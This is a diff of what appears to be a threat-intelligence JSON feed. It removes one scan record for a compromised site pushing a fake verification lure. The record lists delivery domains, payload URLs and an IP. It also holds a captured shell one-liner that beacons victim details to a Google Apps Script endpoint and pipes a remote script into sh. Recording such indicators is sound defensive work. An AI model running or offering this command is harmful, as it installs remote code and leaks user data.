@@ -2673,30 +2673,5 @@
     ],
     "ReportId": "cmwhog6ec0tm10oml7nm0t100",
     "ScannedAt": "2026-11-15T10:13:55.231000+00:00"
-  },
-  {
-    "UrlDomain": "happyvegi.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "198.177.125.109"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=640385ed-f63b-4590-91d7-0bf7d1505c78&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhappyvegi[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T09%3A28%3A57.773Z&lastShellAt=2026-11-15T09%3A28%3A57.773Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwhmwg110tch0omlhhoi42we",
-    "ScannedAt": "2026-11-15T09:30:34.966000+00:00"
   }
 ]
